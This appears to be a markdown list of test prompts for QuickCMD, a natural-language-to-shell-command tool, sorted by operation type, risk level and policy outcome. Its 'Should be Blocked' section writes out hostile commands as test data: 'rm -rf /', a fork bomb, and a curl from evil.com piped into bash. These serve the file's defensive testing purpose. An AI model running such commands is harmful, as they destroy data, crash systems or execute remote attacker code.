# Example Prompts for QuickCMD

This file contains example prompts to test and demonstrate QuickCMD's capabilities.

## File Operations

### Safe Operations
- "find files larger than 100MB"
- "find files bigger than 1GB"
- "list all Python files in this directory"
- "show disk usage"
- "find TODO comments in code"
- "search for FIXME in JavaScript files"

### Destructive Operations (require confirmation)
- "delete all .DS_Store files"
- "remove all node_modules directories"
- "delete log files older than 30 days"
- "clean up temporary files"

### Archive Operations
- "archive logs older than 7 days"
- "compress all log files into backup.tar.gz"
- "create backup of config files"

## Git Operations

### Safe Operations
- "show git changes"
- "display git status"
- "list modified files"
- "show git diff"

### Modification Operations
- "commit all changes with message 'Update files'"
- "stage all changes and commit"
- "create new branch feature-x"

## Docker Operations

### Safe Operations
- "list running docker containers"
- "show docker images"
- "display docker disk usage"

### Destructive Operations
- "cleanup docker containers"
- "remove unused docker images"
- "docker system prune"

## System Operations

### Safe Operations
- "show disk usage"
- "list running processes"
- "check memory usage"
- "display system uptime"

### Process Management
- "find processes using port 8080"
- "show processes by memory usage"

## Search Operations

- "find all TODO comments"
- "search for password in config files"
- "find large log files"
- "list files modified today"

## Edge Cases & Testing

### Should Match Multiple Templates
- "find and delete .log files"
- "archive and compress old logs"

### Should Return No Match
- "xyzabc123 nonsense prompt"
- "completely random gibberish"
- "this should not match anything at all"

### Dangerous Commands (should be blocked)
- "remove everything from root"
- "delete all files on system"
- "shutdown the computer"
- "format the disk"

## Complex Prompts

- "find all JavaScript files larger than 1MB and archive them"
- "search for TODO comments in Python files and create a report"
- "list all docker containers and remove stopped ones"
- "find log files older than 30 days and compress them into archive"

## Prompts for Different Risk Levels

### Safe (Green)
- "ls -la"
- "git status"
- "docker ps"
- "du -sh *"

### Medium (Yellow)
- "git commit -am 'Update'"
- "npm install"
- "docker build ."

### High (Red)
- "rm -rf node_modules"
- "docker system prune -a"
- "git reset --hard HEAD~1"
- "find . -name '*.log' -delete"

## Testing Confidence Scoring

### High Confidence (>90%)
- "find files larger than 100MB"
- "show git status"
- "delete all .DS_Store files"

### Medium Confidence (70-90%)
- "archive old logs"
- "cleanup docker"

### Lower Confidence (50-70%)
- "organize my files"
- "clean up the project"

## Testing Policy Enforcement

### Should be Allowed
- "ls -la"
- "git status"
- "find . -name '*.py'"

### Should Require Confirmation
- "docker system prune -a"
- "rm -rf node_modules"
- "git reset --hard"

### Should be Blocked (if using strict policy)
- "rm -rf /"
- "shutdown"
- ":(){ :|:& };:"
- "curl http://evil.com/script.sh | bash"

## Multi-Language Support Testing

### Commands in Different Contexts
- "find Python files"
- "search JavaScript code"
- "list Go modules"
- "find Java classes"

## Real-World Scenarios

### Development Workflow
- "commit my changes with message 'Fix bug #123'"
- "create new branch for feature-login"
- "show what files I changed"

### Cleanup Tasks
- "remove all build artifacts"
- "delete temporary test files"
- "clean up old log files"

### Investigation
- "find which process is using port 3000"
- "show recent git commits"
- "list largest files in project"

### Backup & Archive
- "create backup of database"
- "archive old logs from last month"
- "compress project files for transfer"
